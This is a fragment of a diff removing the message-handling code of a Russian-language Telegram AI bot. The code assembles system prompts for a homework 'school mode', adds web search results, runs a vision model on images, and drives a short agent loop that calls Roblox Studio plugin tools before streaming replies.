-            1: "Строго научно",
-            2: "Креативно с примерами",
-            3: "С тезисами и планом",
-            4: "Сторителлинг",
-            5: "Аналитически за и против",
-            6: "Подробно на 5+"
-        }
-        dice_style = styles.get(dm.dice.value, "")
-        await message.answer(f"🎲 Выпало {dm.dice.value}! Стиль: {dice_style}")
-
-    # Сборка системного промпта
-    today_str = datetime.now().strftime("%d.%m.%Y %H:%M")
-    sys_prompt = f"{BASE_SYSTEM_PROMPT}\nТекущая дата и время: {today_str}."
-
-    if u["custom_prompt"]:
-        sys_prompt += f"\nДополнительная инструкция пользователя: {u['custom_prompt']}"
-
-    if s["active"]:
-        sys_prompt += f"\n[РЕЖИМ ШКОЛА]: Ученик {s['grade']}, {s['quarter']}, уровень знаний: {s['level']}. Тема: {s['topic']}. Тип работы: {s['hw_type']}."
-        if dice_style:
-            sys_prompt += f" Стиль выполнения: {dice_style}."
-
-        if s["hw_type"] == "Письменное" and s["training_samples"]:
-            sys_prompt += "\nОформляй решение СТРОГО по этим примерам учителя:\n" + "\n".join(s["training_samples"][-4:])
-
-    # Проверяем, включен ли режим Roblox Studio MCP
-    rbx_mode = u.get("roblox", {}).get("active", False)
-    rbx_online, rbx_place = is_roblox_online(uid)
-
-    if rbx_mode:
-        if rbx_online:
-            sys_prompt += f"\n\n{ROBLOX_MCP_SYSTEM_PROMPT}\nТекущий открытый плейс игрока: {rbx_place}."
-        else:
-            await message.answer(
-                "⚠️ <b>Режим Roblox Studio включен, но ваша Studio сейчас не подключена к боту!</b>\n"
-                "Откройте плагин <b>ШколоAI MCP</b> в Roblox Studio и нажмите <b>«Подключиться к боту»</b>.",
-                parse_mode="HTML"
-            )
-
-    temp = await message.answer(
-        "🎮 Связываюсь с Roblox Studio..." if (rbx_mode and rbx_online) else ("🖼 Анализирую изображение..." if image_b64 else "⏳ Думаю...")
-    )
-
-    # Поиск в интернете
-    web_context = ""
-    if u["web_search"] and raw_text:
-        try:
-            await temp.edit_text("🌐 Ищу актуальную информацию в интернете...")
-        except Exception:
-            pass
-        web_context = await search_internet(raw_text)
-        if web_context:
-            sys_prompt += (
-                "\n\n[ВАЖНО: У ТЕБЯ ЕСТЬ ДОСТУП К АКТУАЛЬНОМУ ИНТЕРНЕТУ!]\n"
-                "Ниже приведены свежие результаты поиска по запросу пользователя. "
-                "Используй эти факты, цифры и даты как основной источник правды. "
-                "Никогда не пиши, что у тебя нет доступа к интернету или данным в реальном времени."
-            )
-
-    try:
-        # ВЕТКА 1: ЗАПРОС С ИЗОБРАЖЕНИЕМ (VISION) — работает всегда, когда есть фото!
-        if image_b64 and not (rbx_mode and rbx_online):
-            final_user_text = raw_text
-            if web_context:
-                final_user_text = f"{raw_text}\n\n[Данные из интернета]:\n{web_context}"
-
-            resp_text = await create_vision_completion(
-                preferred_model=u["current_model"],
-                sys_prompt=sys_prompt,
-                history=u["history"],
-                user_text=final_user_text,
-                b64_image=image_b64
-            )
-            try:
-                await temp.delete()
-            except Exception:
-                pass
-
-            await send_smart_ai_response(message, resp_text)
-
-            u["history"].append({
-                "role": "user",
-                "content": f"[Пользователь прислал изображение. Запрос: {raw_text or 'без подписи'}]"
-            })
-            u["history"].append({"role": "assistant", "content": resp_text})
-
-        # ВЕТКА 2: ТЕКСТОВЫЙ ЗАПРОС ИЛИ АГЕНТ ROBLOX STUDIO MCP
-        else:
-            # Если пользователь прислал фото ВМЕСТЕ с включенным режимом Roblox Studio —
-            # сначала считываем описание/код с картинки через Vision, чтобы Roblox-агент знал, что делать!
-            vision_description_for_rbx = ""
-            if image_b64 and rbx_mode and rbx_online:
-                try:
-                    await temp.edit_text("🖼 Анализирую ваш скриншот для Roblox Studio...")
-                    vision_description_for_rbx = await create_vision_completion(
-                        preferred_model=u["current_model"],
-                        sys_prompt="Ты эксперт по Roblox Studio. Подробно опиши всё, что видишь на этом скриншоте (объекты, цвета, интерфейс, ошибки в консоли или структуру скриптов).",
-                        history=[],
-                        user_text=raw_text or "Опиши всё содержимое этого изображения для реализации в Roblox Studio.",
-                        b64_image=image_b64
-                    )
-                except Exception:
-                    vision_description_for_rbx = ""
-
-            messages_payload = [{"role": "system", "content": sys_prompt}]
-            for msg in u["history"][-10:]:
-                messages_payload.append(msg)
-
-            user_content = raw_text
-            if vision_description_for_rbx:
-                user_content = (
-                    f"[Пользователь прикрепил изображение. Содержимое изображения]:\n{vision_description_for_rbx}\n\n"
-                    f"Запрос пользователя: {raw_text or 'Выполни действия в Roblox Studio на основе этого изображения.'}"
-                )
-            if web_context:
-                user_content = (
-                    f"{web_context}\n\n"
-                    f"---\nИспользуя найденную выше информацию из интернета, ответь на вопрос пользователя:\n{user_content}"
-                )
-
-
-            # ЕСЛИ АКТИВЕН ROBLOX MCP И STUDIO ПОДКЛЮЧЕНА -> ЗАПУСКАЕМ ЦИКЛ АГЕНТА (ДО 6 ШАГОВ)
-            if rbx_mode and rbx_online:
-                executed_logs = []
-                final_answer = ""
-
-                for step in range(6):
-                    resp = await create_chat_completion(
-                        model=active_model,
-                        messages=messages_payload,
-                        stream=False
-                    )
-                    ai_reply = (resp.choices[0].message.content or "").strip()
-                    mcp_calls = extract_mcp_calls(ai_reply)
-
-                    if not mcp_calls:
-                        final_answer = ai_reply
-                        break
-
-                    messages_payload.append({"role": "assistant", "content": ai_reply})
-                    tool_results_for_ai = []
-
-                    for call in mcp_calls:
-                        t_name = call.get("tool", "")
-                        t_args = call.get("args", {})
-                        try:
-                            await temp.edit_text(
-                                f"🎮 <b>Roblox Studio MCP (Шаг {step + 1}):</b>\n"
-                                f"Выполняю <code>{html.escape(t_name)}</code> на вашем плейсе...",
-                                parse_mode="HTML"
-                            )
-                        except Exception:
-                            pass
-
-                        exec_res = await execute_roblox_mcp_tool(uid, t_name, t_args)
-                        ok_icon = "✅" if exec_res["success"] else "⚠️"
-                        short_res = exec_res["result"][:300]
-                        executed_logs.append(f"{ok_icon} <code>{html.escape(t_name)}</code>: {html.escape(short_res)}")
-
-                        tool_results_for_ai.append(
-                            f"Результат вызова {t_name} (success={exec_res['success']}):\n{exec_res['result'][:3500]}"
-                        )
-
-                    messages_payload.append({
-                        "role": "user",
-                        "content": (
-                            "[СИСТЕМНЫЙ ОТВЕТ ОТ ПЛАГИНА ROBLOX STUDIO]:\n"
-                            + "\n\n".join(tool_results_for_ai)
-                            + "\n\nЕсли нужно выполнить еще действия на плейсе — вызови следующий `<mcp_call>`. "
-                            "Если задача полностью выполнена — напиши понятный итоговый ответ пользователю без тегов `<mcp_call>`."
-                        )
-                    })
-
-                if not final_answer:
-                    final_answer = "✅ Все команды отправлены и выполнены в вашей Roblox Studio!"
-
-                # Очищаем случайные остатки тегов <mcp_call> из финального текста
-                clean_final = MCP_CALL_RE.sub("", final_answer).strip()
-
-                try:
-                    await temp.delete()
-                except Exception:
-                    pass
-
-                if executed_logs:
-                    log_block = "🎮 <b>Выполнено в Roblox Studio:</b>\n" + "\n".join(executed_logs)
-                    await message.answer(log_block, parse_mode="HTML")
-
-                if clean_final:
-                    await send_smart_ai_response(message, clean_final)
-
-                resp_text = clean_final or "Выполнено в Roblox Studio."
-                u["history"].append({"role": "user", "content": raw_text})
-                u["history"].append({"role": "assistant", "content": resp_text})
-
-            # СТАНДАРТНЫЙ СТРИМИНГ ТЕКСТОВОГО ОТВЕТА
-            else:
-                resp_text = ""
-                last_ed = time.time()
-
-                try:
-                    stream = await create_chat_completion(
-                        model=active_model,
-                        messages=messages_payload,
-                        stream=True
-                    )
-                    async for chunk in stream:
-                        if chunk.choices and chunk.choices[0].delta:
-                            delta = chunk.choices[0].delta
-                            piece = getattr(delta, "content", None) or ""
-                            resp_text += piece
-                            if time.time() - last_ed > 1.5 and resp_text.strip():
-                                preview = resp_text[:3800]
-                                if len(resp_text) > 3800:
-                                    preview += f"\n\n⏳ <i>Генерирую продолжение ({len(resp_text)} симв.)...</i>"
-                                else:
-                                    preview += " ✍️"
-                                try:
-                                    await temp.edit_text(preview)
-                                    last_ed = time.time()
-                                except Exception:
-                                    pass
-                except Exception:
-                    resp_text = ""
-
-                if not resp_text.strip():
-                    resp = await create_chat_completion(
-                        model=active_model,
-                        messages=messages_payload,
-                        stream=False
-                    )
-                    resp_text = (resp.choices[0].message.content or "").strip()
-
-                try:
-                    await temp.delete()
-                except Exception:
-                    pass
-
-                if not resp_text:
-                    resp_text = "⚠️ Модель вернула пустой ответ. Попробуйте переформулировать запрос или сменить модель."
-
-                await send_smart_ai_response(message, resp_text)
-
-                u["history"].append({"role": "user", "content": raw_text})
-                u["history"].append({"role": "assistant", "content": resp_text})
-
-        if len(u["history"]) > 12:
-            u["history"] = u["history"][-12:]
-
-        u["tokens"] += max(50, len(resp_text) // 3)
-        save_data()
-
-    except Exception as e:
-        await temp.edit_text(f"❌ Ошибка API: {str(e)[:300]}")
-
-
-async def main():
-    load_data()
-    # Запускаем встроенный HTTP MCP-сервер для Roblox Studio параллельно с Telegram-ботом
-    await start_mcp_http_server()
-    print(f"✅ Бот запущен! Модель фото: {bot_config['photo_model']}")
-    await dp.start_polling(bot)
-
-
-if __name__ == "__main__":
-    asyncio.run(main())
+    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboard
